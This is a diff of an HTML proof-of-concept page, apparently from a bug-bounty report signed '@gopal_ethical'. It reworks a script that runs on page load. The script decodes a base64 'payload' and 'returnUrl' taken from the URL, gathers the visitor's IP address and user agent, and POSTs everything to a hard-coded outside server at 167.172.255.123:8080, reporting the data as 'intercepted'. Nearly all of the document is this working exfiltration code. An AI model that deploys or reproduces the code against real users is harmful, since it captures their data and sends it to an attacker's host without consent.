@@ -3,38 +3,64 @@
 <head>
     <title>Commissioning POC</title>
     <meta charset="UTF-8">
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        #status { margin-top: 20px; padding: 10px; border-radius: 5px; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+    </style>
 </head>
 <body>
-    <h1>Poc by @gopal_ethical</h1>
-    <div id="status">Sending data...</div>
+    <h1>poc by @gopal_ethical</h1>
+    <div id="status">Initializing...</div>
 
     <script>
-        async function sendData() {
-            const payload = new URLSearchParams(window.location.search).get("payload");
-            const returnUrl = new URLSearchParams(window.location.search).get("returnUrl");
+        async function interceptData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const payload = urlParams.get("payload");
+            const returnUrl = urlParams.get("returnUrl");
 
+            // Prepare data to send
             const dataToSend = {
-                payload: JSON.parse(atob(decodeURIComponent(payload))),
+                payload: tryDecodePayload(payload),
                 returnUrl: returnUrl,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: await fetch('https://api.ipify.org?format=json')
+                            .then(r => r.json())
+                            .catch(() => null)
             };
 
+            // Send to VPS
             try {
                 const response = await fetch("https://167.172.255.123:8080/log", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(dataToSend)
                 });
-                document.getElementById("status").textContent = 
-                    `✅ Data sent! Status: ${response.status}`;
+
+                updateStatus(`✅ Data intercepted successfully (HTTP ${response.status})`, "success");
             } catch (err) {
-                document.getElementById("status").textContent = 
-                    `❌ Error: ${err.message}`;
+                updateStatus(`❌ Failed to send: ${err.message}`, "error");
             }
         }
 
-        // Start sending when page loads
-        window.onload = sendData;
+        function tryDecodePayload(base64) {
+            try {
+                return JSON.parse(atob(decodeURIComponent(base64)));
+            } catch (e) {
+                return { error: "Decoding failed", details: e.message };
+            }
+        }
+
+        function updateStatus(message, cssClass) {
+            const statusDiv = document.getElementById("status");
+            statusDiv.textContent = message;
+            statusDiv.className = cssClass;
+        }
+
+        // Start interception when page loads
+        window.onload = interceptData;
     </script>
 </body>
 </html>
